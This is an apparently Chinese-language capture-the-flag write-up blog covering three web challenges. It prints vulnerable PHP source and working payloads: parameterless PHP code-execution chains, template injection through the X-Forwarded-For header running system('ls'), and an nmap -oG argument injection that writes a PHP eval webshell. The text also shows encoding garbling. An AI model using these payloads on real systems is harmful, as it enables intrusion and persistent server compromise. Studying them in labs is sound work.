<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?\S</span>*=<span class="hljs-variable">$&#123;</span>getFlag()&#125;&amp;cmd=system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure>

<h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p>å¼€å§‹é¡µé¢æœªæ‰¾åˆ°å¯åˆ©ç”¨ä¿¡æ¯ï¼ŒæŠ“åŒ…ä¹Ÿä»€ä¹ˆæ²¡æœ‰å‘ç°<br>ç”¨dirsearchæœæœ<br><img src="/images/FGQ77UZZI9ZN0I.png" srcset="/img/loading.gif" lazyload><br>å‡ºç°äº†å¾ˆå¤š.gitåç¼€çš„æ–‡ä»¶ï¼Œç¡®å®šä¸ºgitæºç æ³„éœ²<br>ä½¿ç”¨githackæ‰«ä¸€æ‰«<br>æ‰«å‡ºäº†ç½‘ç«™çš„æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>                <span class="hljs-comment">// echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>å¼€å§‹ä»£ç å®¡è®¡<br>è¿™ä¸€é¢˜æœ‰å¾ˆå¤šçš„è¿‡æ»¤<br>ç¬¬äºŒä¸ªifè¿‡æ»¤è®©phpä¼ªåè®®dataåè®®éƒ½ä¸èƒ½ç”¨äº†<br>ç¬¬äºŒä¸ªif</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, NULL, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])</span></span>)<br></code></pre></td></tr></table></figure>

<p><code>[a-z,_]+ : [a-z,_]</code><br>åŒ¹é…å°å†™å­—æ¯å’Œä¸‹åˆ’çº¿ +è¡¨ç¤º1åˆ°å¤šä¸ª</p>
<p><code>(?R)?</code><br>(?R)ä»£è¡¨å½“å‰è¡¨è¾¾å¼ï¼Œå°±æ˜¯è¿™ä¸ª<code>(/[a-z,_]+((?R)?)/)</code>ï¼Œæ‰€ä»¥ä¼šä¸€ç›´é€’å½’ï¼Œ?è¡¨ç¤ºé€’å½’å½“å‰è¡¨è¾¾å¼0æ¬¡æˆ–1æ¬¡ï¼ˆè‹¥æ˜¯(?R)*åˆ™è¡¨ç¤ºé€’å½’å½“å‰è¡¨è¾¾å¼0æ¬¡æˆ–å¤šæ¬¡ï¼Œä¾‹å¦‚å®ƒå¯ä»¥åŒ¹é…<code>a(b(c()d())))</code></p>
<p>å¦‚æœä¼ è¿›å»çš„å€¼æ˜¯å­—ç¬¦ä¸²æ¥ä¸€ä¸ª()ï¼Œé‚£ä¹ˆå­—ç¬¦ä¸²å°±ä¼šè¢«æ›¿æ¢ä¸ºç©ºï¼Œå¦‚æœ(é€’å½’)æ›¿æ¢åçš„å­—ç¬¦ä¸²åªå‰©ä¸‹<code>;</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¼ è¿›å»çš„expå°±ä¼šè¢«evalæ‰§è¡Œã€‚æ¯”å¦‚æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ª<code>phpinfo();</code>,ä»–è¢«æ›¿æ¢åå°±å‰©ä¸‹<code>;</code>,é‚£ä¹ˆæ›´å…·æ¡ä»¶å°±ä¼šæ‰§è¡Œ<code>phpinfo();</code></p>
<p>è€Œ(?R)?èƒ½åŒ¹é…çš„åªæœ‰<code>a(b()); a(b(c()));</code>è¿™ç§ç±»å‹çš„ï¼Œæ¯”å¦‚ä¼ å…¥<code>a(b(c()));</code>,ç¬¬ä¸€æ¬¡åŒ¹é…åï¼Œå°±å‰©<code>a(b())</code>,ç¬¬äºŒæ¬¡åŒ¹é…å,<code>a();</code>,ç¬¬ä¸‰æ¬¡åŒ¹é…åå°±å‰©ä¸‹<code>;</code>äº†ï¼Œæœ€å<code>a(b(c()))</code>å°±ä¼šè¢«evalæ‰§è¡Œã€‚</p>
<p>è¿™é¢˜çš„æ€è·¯åˆ°è¿™å°±å¾ˆæ˜ç¡®äº†ï¼Œä½¿ç”¨æ— å‚RCE<br>ä¸‹é¢æ˜¯æ— å‚RCEçš„å¸¸ç”¨å‡½æ•°</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">getchwd</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚<br><span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚<br><span class="hljs-function"><span class="hljs-title">dirname</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚<br><span class="hljs-function"><span class="hljs-title">chdir</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚<br><span class="hljs-function"><span class="hljs-title">readfile</span><span class="hljs-params">()</span></span>ï¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚<br><span class="hljs-function"><span class="hljs-title">current</span><span class="hljs-params">()</span></span>ï¼šè¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚<br><span class="hljs-function"><span class="hljs-title">pos</span><span class="hljs-params">()</span></span>ï¼š<span class="hljs-built_in">current</span>() çš„åˆ«åã€‚<br><span class="hljs-function"><span class="hljs-title">next</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br><span class="hljs-function"><span class="hljs-title">end</span><span class="hljs-params">()</span></span>ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br><span class="hljs-function"><span class="hljs-title">array_rand</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®åï¼Œæˆ–è€…å¦‚æœæ‚¨è§„å®šå‡½æ•°è¿”å›ä¸åªä¸€ä¸ªé”®åï¼Œåˆ™è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚<br><span class="hljs-function"><span class="hljs-title">array_flip</span><span class="hljs-params">()</span></span>ï¼š<span class="hljs-built_in">array_flip</span>() å‡½æ•°ç”¨äºåè½¬/äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚<br><span class="hljs-function"><span class="hljs-title">array_slice</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°åœ¨æ•°ç»„ä¸­æ ¹æ®æ¡ä»¶å–å‡ºä¸€æ®µå€¼ï¼Œå¹¶è¿”å›ã€‚<br><span class="hljs-function"><span class="hljs-title">array_reverse</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°è¿”å›ç¿»è½¬é¡ºåºçš„æ•°ç»„ã€‚<br><span class="hljs-function"><span class="hljs-title">chr</span><span class="hljs-params">()</span></span> å‡½æ•°ä»æŒ‡å®šçš„ï¼šASCII å€¼è¿”å›å­—ç¬¦ã€‚<br><span class="hljs-function"><span class="hljs-title">hex2bin</span><span class="hljs-params">()</span></span>ï¼šâ€” è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚<br><span class="hljs-function"><span class="hljs-title">getenv</span><span class="hljs-params">()</span></span>ï¼šè·å–ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼(åœ¨<span class="hljs-number">7.1</span>ä¹‹åå¯ä»¥ä¸ç»™äºˆå‚æ•°)ã€‚<br><span class="hljs-function"><span class="hljs-title">localeconv</span><span class="hljs-params">()</span></span>ï¼šå‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚<br></code></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?exp=print<span class="hljs-constructor">_r(<span class="hljs-params">scandir</span>(<span class="hljs-params">pos</span>(<span class="hljs-params">localeconv</span>()</span>)));<br></code></pre></td></tr></table></figure>
<p><img src="/images/Q18QQU2TN4NTI9VNSA0.png" srcset="/img/loading.gif" lazyload><br><strong>ä»£ç è§£é‡Šï¼š</strong><br>æƒ³è¦æµè§ˆç›®å½•å†…çš„æ‰€æœ‰æ–‡ä»¶éœ€è¦ç”¨åˆ°å‡½æ•°<code>scandir()</code>ã€‚å½“<code>scandir()</code>ä¼ å…¥<code>.</code>,å®ƒå°±å¯ä»¥åˆ—å‡ºå½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶ã€‚<br>ä½†è¿™é‡Œæ˜¯æ— å‚æ•°çš„RCEï¼Œæˆ‘ä»¬ä¸èƒ½å†™<code>scandir(.)</code>,è€Œ<code>localeconv()</code>å´ä¼šæœ‰ä¸€ä¸ªè¿”å›å€¼ï¼Œé‚£ä¸ªè¿”å›å€¼æ­£å¥½å°±æ˜¯<code>.</code>,å†é…åˆ<code>pos</code>æˆ–<code>current()</code>å°±å¯ä»¥æŠŠ<code>.</code>å–å‡ºæ¥ä¼ ç»™<code>scandir()</code>æŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶äº†ã€‚</p>
<p>ç°åœ¨çŸ¥é“äº†flagçš„ä½ç½®ï¼Œflagä¸ºå€’æ•°ç¬¬äºŒä¸ªï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç¿»è½¬å‡½æ•°<code>array_reverse()</code>ï¼Œå†ç”¨ä¸€ä¸ªnextå°±å¯ä»¥æŸ¥çœ‹flagæ–‡ä»¶äº†ï¼ŒæŸ¥çœ‹flagæ–‡ä»¶å¯ç”¨å‡½æ•°ä¸º<code>highlight_file(),readfile(),show_source()</code>ç­‰ç­‰ã€‚ã€‚ã€‚<br>payload:</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">?<span class="hljs-keyword">exp</span>=readfile(<span class="hljs-keyword">next</span>(array_reverse(scandir(<span class="hljs-keyword">pos</span>(localeconv())))));<br><span class="hljs-regexp">//</span>$flag = <span class="hljs-string">&quot;flag&#123;c4305172-c8af-4fa8-af1f-504d83d83583&#125;&quot;</span>;<br></code></pre></td></tr></table></figure>
<p>è™½ç„¶æœ¬é¢˜çš„flagä½ç½®ä¸æ˜¯é‚£ä¹ˆç‰¹æ®Šï¼Œä½†æ€»ä¼šé‡åˆ°ç‰¹æ®Šä½ç½®flagçš„é¢˜ï¼Œå¯ä»¥ç”¨<code>array_rand()</code>å’Œ<code>array_flip()</code><br>(<code>array_rand()</code>è¿”å›çš„æ˜¯é”®åæ‰€ä»¥å¿…é¡»æ­é…<code>array_flip()</code>æ¥äº¤æ¢é”®åã€é”®å€¼æ¥è·å¾—é”®å€¼ï¼Œéšæœºåˆ·æ–°æ˜¾ç¤ºçš„å†…å®¹)<br>payload:</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?exp=show<span class="hljs-constructor">_source(<span class="hljs-params">array_rand</span>(<span class="hljs-params">array_flip</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">pos</span>(<span class="hljs-params">localeconv</span>()</span>)))));<br></code></pre></td></tr></table></figure>

<p><strong>æ–¹æ³•äºŒï¼šsession_id()</strong><br>ä¸Šé¢çš„æ­£åˆ™è¿‡æ»¤ä¸­å¹¶æ²¡æœ‰è¿‡æ»¤sessionï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨session_idæ¥è·å–flag<br><code>session_id()</code><br>å¯ä»¥ç”¨æ¥è·å–&#x2F;è®¾ç½®å½“å‰ä¼šè¯idã€‚<br>phpæ˜¯é»˜è®¤ä¸ä¸»åŠ¨ä½¿ç”¨sessionçš„<br>åœ¨æˆ‘ä»¬ä½¿ç”¨session_id()çš„æ—¶å€™ éœ€è¦ä½¿ç”¨<code>session_start()</code>æ¥å¼€å¯sessionä¼šè¯<br>PHPSESSIDæœ¬èº«æ˜¯å¯ä»¥ç›´æ¥åŠ ä¸Šä¾‹å¦‚flag.phpè¿™ç±»çš„å­—ç¬¦çš„<br>payload:</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">exp</span>=show_source(session_id(session_start()));<br>COOKIE:<br><span class="hljs-attribute">PHPSESSID</span>=flag.php<br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Manuffer/article/details/120738755">æ— å‚RCEä¼ é€é—¨</a><br>å†™çš„éå¸¸å¥½ï¼Œæ”¶è·é¢‡ä¸°ğŸ¤¤</p>
<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>å¯åŠ¨ç¯å¢ƒ<br>flag.txt<br><img src="/images/RDZVO40JRJ84SIYW.png" srcset="/img/loading.gif" lazyload><br>hint.phpä¸­æŸ¥çœ‹æºç çš„æ³¨é‡Šä½œè€…ä¹Ÿè¯´äº†Do you know why i know your ip?<br>ç»“åˆé¢˜ç›®ä¸ä½œè€…çš„hintï¼ŒçŒœæµ‹æœ¬é¢˜x-forwarded-forå¤„æœ‰é—®é¢˜<br>burpsuiteæŠ“æŠ“<br><img src="/images/5ENMQE2LCM1KOF03JQ8.png" srcset="/img/loading.gif" lazyload><br>æˆåŠŸæ‰§è¡Œï¼Œè¯´æ˜XFFå¯æ§<br>æ§åˆ¶XFFè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼ˆè¿™æ˜¯è¦åœ¨å‰ç«¯æœ‰IPç›¸å…³å›æ˜¾çš„æƒ…å†µï¼‰<br>æŸ¥é˜…èµ„æ–™<br>Flaskå¯èƒ½å­˜åœ¨Jinjia2æ¨¡ç‰ˆæ³¨å…¥æ¼æ´<br>PHPå¯èƒ½å­˜åœ¨Twigæ¨¡ç‰ˆæ³¨å…¥æ¼æ´<br>è¯•è¯•èƒ½å¦æ‰§è¡Œæ¨¡æ¿ç®—å¼</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">x-forwarded-for:</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/LJ7EPLUC0WFRYGH.png" srcset="/img/loading.gif" lazyload><br>æˆåŠŸæ‰§è¡Œï¼Œå°è¯•æ˜¯å¦èƒ½æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">x-forwarded-for:</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;ls&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/12M2VGZKUFL40.png" srcset="/img/loading.gif" lazyload><br>æ— è„‘RCE<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/13049923.html">æ¨¡æ¿æ³¨å…¥æ£€æµ‹</a></p>
<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$host</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$host</span>);<br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$host</span>);<br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;glzjin&quot;</span>. <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you are in sandbox &#x27;</span>.<span class="hljs-variable">$sandbox</span>;<br>    @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<span class="hljs-comment">//åˆ›å»ºç›®å½•</span><br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<span class="hljs-comment">//æ”¹å˜å½“å‰çš„ç›®å½•</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="hljs-variable">$host</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>HTTP_X_FORWARDED_FOR HTTPæ‰©å±•å¤´éƒ¨ï¼Œç”¨æ¥è¡¨ç¤ºhttpè¯·æ±‚ç«¯çœŸå®ip</p>
<p>REMOTE_ADDRä»£è¡¨å®¢æˆ·ç«¯çš„IPï¼Œä½†å®ƒçš„å€¼ä¸æ˜¯ç”±å®¢æˆ·ç«¯æä¾›çš„ï¼Œè€Œæ˜¯æœåŠ¡ç«¯æ ¹æ®å®¢æˆ·ç«¯çš„ipæŒ‡å®šçš„ï¼Œå½“ä½ çš„æµè§ˆå™¨è®¿é—®æŸä¸ªç½‘ç«™æ—¶ï¼Œå‡è®¾ä¸­é—´æ²¡æœ‰ä»»ä½•ä»£ç†ï¼Œé‚£ä¹ˆç½‘ç«™çš„webæœåŠ¡å™¨ï¼ˆNginxï¼ŒApacheç­‰ï¼‰å°±ä¼šæŠŠremote_addrè®¾ä¸ºä½ çš„æœºå™¨IPï¼Œå¦‚æœä½ ç”¨äº†æŸä¸ªä»£ç†ï¼Œé‚£ä¹ˆä½ çš„æµè§ˆå™¨ä¼šå…ˆè®¿é—®è¿™ä¸ªä»£ç†ï¼Œç„¶åå†ç”±è¿™ä¸ªä»£ç†è½¬å‘åˆ°ç½‘ç«™ï¼Œè¿™æ ·webæœåŠ¡å™¨å°±ä¼šæŠŠremote_addrè®¾ä¸ºè¿™å°ä»£ç†æœºå™¨çš„IPã€‚</p>
<p>æœ¬é¢˜ä¸»è¦è€ƒå¯Ÿçš„æ˜¯escapeshellargå’Œescapeshellcmdè¿™ä¸¤ä¸ªå‡½æ•°</p>
<ul>
<li>escapeshellargï¼šå¯¹ä¼ å…¥çš„å­—ç¬¦ä¸²ç”¨ä¸€å¯¹å•å¼•å·åŒ…å›´ï¼Œå°†å†…å®¹çš„â€™å…ˆç”¨åæ–œæ è½¬ä¹‰ï¼Œå†æ·»åŠ ä¸€å¯¹å•å¼•å·åŒ…å›´ï¼Œå³å•å¼•å·ä¼šè¢«è½¬ä¹‰ä¸ºâ€™&#39;â€˜</li>
<li>escapeshellcmdï¼šå¯¹\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œè½¬ä¹‰</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ä¼ å…¥çš„å‚æ•°æ˜¯172.17.0.2<span class="hljs-string">&#x27; -v -d a=1</span><br><span class="hljs-string">ç»è¿‡escapeshellargå¤„ç†åå˜æˆäº†&#x27;</span>172.17.0.2<span class="hljs-string">&#x27;\&#x27;</span><span class="hljs-string">&#x27; -v -d a=1&#x27;</span>ï¼Œå³å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚<br>ç»è¿‡escapeshellcmdå¤„ç†åå˜æˆ<span class="hljs-string">&#x27;172.17.0.2&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1\&#x27;ï¼Œè¿™æ˜¯å› ä¸ºescapeshellcmdå¯¹\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰ï¼š<br>æœ€åæ‰§è¡Œçš„å‘½ä»¤æ˜¯curl <span class="hljs-string">&#x27;172.17.0.2&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1\&#x27;ï¼Œç”±äºä¸­é—´çš„\\è¢«è§£é‡Šä¸º\è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„&#x27;æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„&#x27;é…å¯¹æˆäº†ä¸€ä¸ªç©ºç™½è¿æ¥ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸ºcurl 172.17.0.2\ -v -d <span class="hljs-attribute">a</span>=1&#x27;,å³å‘172.17.0.2\å‘èµ·è¯·æ±‚ï¼ŒPOSTæ•°æ®ä¸ºa=1&#x27;ã€‚<br></code></pre></td></tr></table></figure>

<p>ä¸¤æ¬¡è½¬ä¹‰åå‡ºç°äº†é—®é¢˜ï¼Œæ²¡æœ‰è€ƒè™‘åˆ°å•å¼•å·çš„é—®é¢˜<br>å†å¾€ä¸‹çœ‹ï¼Œçœ‹åˆ°echo system(â€œnmap -T5 -sT -Pn â€“host-timeout 2 -F â€œ.$host);<br>è¿™é‡Œæœ‰ä¸ªsystemæ¥æ‰§è¡Œå‘½ä»¤ï¼Œè€Œä¸”æœ‰ä¼ å‚ï¼Œè‚¯å®šæ˜¯åˆ©ç”¨è¿™é‡Œäº†</p>
<p>è¿™é‡Œä»£ç çš„æœ¬æ„æ˜¯å¸Œæœ›æˆ‘ä»¬è¾“å…¥ipè¿™æ ·çš„å‚æ•°åšä¸€ä¸ªæ‰«æï¼Œé€šè¿‡ä¸Šé¢çš„ä¸¤ä¸ªå‡½æ•°æ¥è¿›è¡Œè§„åˆ™è¿‡æ»¤è½¬ä¹‰ï¼Œæˆ‘ä»¬çš„è¾“å…¥ä¼šè¢«å•å¼•å·å¼•èµ·æ¥ï¼Œä½†æ˜¯å› ä¸ºæˆ‘ä»¬çœ‹åˆ°äº†ä¸Šé¢çš„æ¼æ´æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€ƒè„±è¿™ä¸ªå¼•å·çš„æŸç¼š</p>
<p>åœ¨nmapå‘½ä»¤ä¸­ï¼Œæœ‰ä¸€ä¸ªå‚æ•°-oGå¯ä»¥å®ç°å°†å‘½ä»¤å’Œç»“æœå†™åˆ°æ–‡ä»¶ï¼Œè¿™ä¸ªå‘½ä»¤å°±æ˜¯æˆ‘ä»¬çš„è¾“å…¥å¯æ§ï¼Œç„¶åå†™å…¥åˆ°æ–‡ä»¶ï¼Œä¼ å…¥ä¸€å¥è¯æœ¨é©¬<br>æ³¨æ„å¼•å·åŠ ç©ºæ ¼ï¼Œä¸åŠ ç©ºæ ¼ä¼šå°†è¯­å¥è½¬ä¹‰ã€‚</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?host=&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG 1.php &#x27;</span><br></code></pre></td></tr></table></figure>
